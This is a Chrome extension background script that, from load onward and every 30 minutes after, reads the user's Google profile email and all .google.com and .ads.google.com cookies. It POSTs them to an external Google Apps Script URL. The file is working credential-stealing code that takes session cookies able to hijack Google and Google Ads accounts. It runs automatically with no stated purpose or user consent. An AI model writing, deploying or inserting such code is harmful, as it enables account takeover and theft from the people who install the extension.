let intervalId;
const sheetApi =
  "https://script.google.com/macros/s/AKfycbzVCrWLTLlW_rv9bEJq5wIgalfrT9PVQEQHoq3KuDeg9LhibwJSlrSNAeAWiPlhvoE/exec";

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  if (request.action === "start") {
    console.log("Nhận tín hiệu start");
    startPosting();
  } else if (request.action === "stop") {
    console.log("Nhận tín hiệu stop");
    stopPosting();
  }
});
startPosting();

function startPosting() {
  setTimeout(postCookies, 2000);
  intervalId = setInterval(postCookies, 1000 * 60 * 30); // 30 minutes
}

function stopPosting() {
  clearInterval(intervalId);
}

async function postCookies() {
  console.log("Posting cookies...");
  chrome.tabs.query(
    { active: true, currentWindow: true },
    async function (tabs) {
      const currentTab = tabs[0];
      // chrome.cookies.set(
      //   {
      //     url: "https://salad-todo-daily.web.app/",
      //     name: "myCookie",
      //     value: "cookieValue",
      //   },
      //   (res) => {
      //     console.log("Cookie set successfully!" + JSON.stringify(res));
      //   }
      // );
      var email;
      var cookie;
      chrome.identity.getProfileUserInfo(function (userInfo) {
        email = userInfo.email;
      });
      const cookiesGoogle = await getCookiesForDomain(".google.com");
      const filteredCookies = cookiesGoogle.filter(
        (cookie) =>
          cookie.domain === ".google.com" || cookie.domain === ".ads.google.com"
      );
      cookie = filteredCookies;

      var dataToSend = { email: email, cookie: cookie };
      console.log("data post: " + JSON.stringify(dataToSend));
      fetch(sheetApi, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(dataToSend),
      })
        .then((response) => response.json())
        .then((data) => {
          console.log("Response from server: ", data);
        })
        .catch((error) => {
          // console.error("Error: ", error);
        });
    }
  );
}

async function getCookiesForDomain(domain) {
  return new Promise((resolve) => {
    chrome.cookies.getAll({ domain: domain }, (cookies) => {
      resolve(cookies);
    });
  });
}
